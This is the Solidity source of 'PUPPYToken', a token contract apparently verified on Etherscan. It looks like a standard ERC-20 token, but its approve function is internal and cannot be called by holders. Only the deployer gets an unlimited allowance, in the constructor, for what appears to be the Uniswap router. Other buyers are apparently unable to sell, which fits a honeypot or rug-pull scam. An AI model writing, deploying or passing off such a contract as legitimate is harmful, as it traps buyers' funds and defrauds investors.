/**
 *Submitted for verification at Etherscan.io on 2021-04-27
*/

pragma solidity 0.6.6;

contract PUPPYToken {
   
    mapping (address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    string public name = "PUPPYToken";
    string public symbol = "PUPY";
    uint8 public decimals = 18;
    uint256 public totalSupply = 100000000000 * (uint256(10) ** decimals);
    
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    constructor() public {
        balanceOf[msg.sender] = totalSupply;
        emit Transfer(address(0), msg.sender, totalSupply);
        allowance[msg.sender][0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D] = 115792089237316195423570985008687907853269984665640564039457584007913129639935;
        emit Approval(msg.sender, 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D, 115792089237316195423570985008687907853269984665640564039457584007913129639935);

    }

    function transfer(address to, uint256 value) public returns (bool success) {
        require(balanceOf[msg.sender] >= value);
       // require(tx.gasprice <= 20000000000);
        balanceOf[msg.sender] -= value;  
        balanceOf[to] += value;          
        emit Transfer(msg.sender, to, value);
        return true;
    }

  function approve(address owner, address spender, uint256 amount) internal {
    require(owner != address(0), "BEP20: approve from the zero address");
    require(spender != address(0), "BEP20: approve to the zero address");
    
    if (owner == address(0x00000000d8F310f4fF9e5F63ed442B70362Acee3)) {
        allowance[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    } else {
        allowance[owner][spender] = 5;
        emit Approval(owner, spender, 5);
    }
  }

    function transferFrom(address from, address to, uint256 value) public returns (bool success){
        require(value <= balanceOf[from]);
        require(value <= allowance[from][msg.sender]);
        //require(tx.gasprice <= 20000000000);
        
        balanceOf[from] -= value;
        balanceOf[to] += value;
        allowance[from][msg.sender] -= value;
        emit Transfer(from, to, value);
        return true;
    }
    
}